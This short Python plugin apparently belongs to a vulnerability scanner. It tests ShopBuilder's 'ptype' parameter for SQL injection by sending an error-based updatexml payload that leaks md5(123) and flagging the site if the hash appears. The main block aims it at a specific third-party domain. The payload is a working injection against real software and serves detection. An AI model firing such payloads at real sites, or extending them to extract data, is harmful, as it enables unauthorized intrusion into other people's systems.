#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Tian.Te
#ShopBuilder /?m=product&s=list&ptype SQL注入
def assign(service,arg):
    if service == "shopbuilder":
        return True, arg

def audit(arg):
    payload ="?m=product&s=list&ptype=0%27%20%20and%201=updatexml%281,concat%280x5c,md5%28123%29%29,1%29%23"
    url = arg + payload
    code, head, res, errcode,finalurl =  curl.curl('"%s"' % url)

    if code == 200 and '202cb962ac59075b964b07152d234b7' in res:
        security_hole(url)

if __name__ == "__main__":
    from dummy import *
    audit(assign('shopbuilder', 'http://www.eseein.com/')[1])